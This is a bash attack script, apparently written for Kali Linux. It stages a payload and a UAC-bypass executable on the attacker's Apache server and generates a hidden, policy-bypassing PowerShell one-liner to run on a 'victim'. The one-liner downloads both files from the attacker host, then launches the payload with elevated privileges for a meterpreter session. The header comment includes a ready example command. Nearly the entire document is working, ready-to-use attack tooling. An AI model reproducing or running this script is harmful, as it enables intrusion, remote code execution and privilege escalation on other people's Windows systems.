#!/bin/bash
##
## r1ddl3r - Jake Bernier
##
## Example:
## C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -w hidden -nop -ep bypass -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/bypassuac.exe','bypassuac.exe');(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/abc.exe','abc.exe');start-process -NoNewWindow 'C:\Users\admin\Documents\bypassuac.exe' -args 'elevate /c C:\Users\admin\Documents\abc.exe'
##
## Best to run on Kali Linux - need Apache2
##
## Simple script to move bypassuac.exe and your payload.exe to apache web server and generate powershell one liner. Powershell line downloads both exe's and executes to elevate privs.
## bypassuac.exe will create tior.exe in additon to two exe's downloaded on victim
## Ensure you have listerner  - with meterpreter use getsytem to elevate :)
##
## bypassuac.exe found here: https://www.trustedsec.com/downloads/tools-download/

SERVICE='apache2'
if ps ax | grep -v grep | grep $SERVICE > /dev/null
then
    echo "$SERVICE service running, moving on..."
else
    echo "$SERVICE is not running, starting $SERVICE" 
        service apache2 start
fi

ip=`ifconfig|xargs|awk '{print $7}'|sed -e 's/[a-z]*:/''/'`
echo "your ip is: $ip"

echo "Enter full path on the victim to place the files (C:\\\path\\\exampledir):"
read path

echo "Enter full path to your payload:"
read payload

echo "Enter full path to bypassuac.exe:"
read bypassuac

ran_payload="$RANDOM.exe"
ran_bypassuac="$RANDOM.exe"
ran_path="$RANDOM"

echo "Moving files..."
mkdir /var/www/$ran_path
cp $payload /var/www/$ran_path/$ran_payload
cp $bypassuac /var/www/$ran_path/$ran_bypassuac

url="http://$ip/$ran_path"
payload_url="$url/$ran_payload"
bypassuac_url="$url/$ran_bypassuac"

read -p "Is target 32bit or 64bit (32/64)?" choice
case "$choice" in 
  32 ) echo "Copy and run on victim:" 
	echo "powershell.exe -w hidden -nop -ep bypass -c (New-Object System.Net.WebClient).DownloadFile('$bypassuac_url','$path\\$ran_bypassuac');(New-Object System.Net.WebClient).DownloadFile('$payload_url','$path\\$ran_payload');start-process -NoNewWindow '$path\\$ran_bypassuac' -args 'elevate /c $path\\$ran_payload' ";;
  64 ) echo "Copy and run on victim:"
        echo "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -w hidden -nop -ep bypass -c (New-Object System.Net.WebClient).DownloadFile('$bypassuac_url','$path\\$ran_bypassuac');(New-Object System.Net.WebClient).DownloadFile('$payload_url','$path\\$ran_payload');start-process -NoNewWindow '$path\\$ran_bypassuac' -args 'elevate /c $path\\$ran_payload' ";;
  * ) echo "invalid response";;
esac

read -p "Enter 'k' to kill apache2 server and clean up..." END
if [ "$END" == "k" ]; then
  service apache2 stop
	rm -r /var/www/$ran_path
		echo "killing and cleaning..."
else
	echo "Manually clean up /var/www/$ran_path"
fi


echo "done :)"
